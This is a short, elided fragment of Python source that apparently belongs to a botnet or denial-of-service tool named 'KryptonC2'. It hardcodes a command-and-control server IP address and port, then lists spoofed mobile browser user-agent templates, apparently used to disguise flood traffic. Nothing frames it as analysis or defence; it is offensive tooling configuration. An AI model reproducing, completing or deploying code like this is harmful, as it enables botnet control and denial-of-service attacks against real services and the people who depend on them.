...
# IP AND PORT C2 ------------------->
KRYPTONC2_ADDRESS  = "185.84.160.86"
KRYPTONC2_PORT     = 9999
...
base_user_agents = [
    ...
    'Mozilla/%.1f (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) CriOS/%.1f.%.1f Mobile/15E148 Safari/%.1f.%.1f',
    'Mozilla/%.1f (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) CriOS/%.1f.%.1f Mobile/15E148 Safari/%.1f.%.1f',
    'Mozilla/%.1f (iPod; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) CriOS/%.1f.%.1f Mobile/15E148 Safari/%.1f.%.1f',
    'Mozilla/%.1f (Linux; Android 10; K) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Chrome/%.1f.%.1f Mobile Safari/%.1f.%.1f'
]
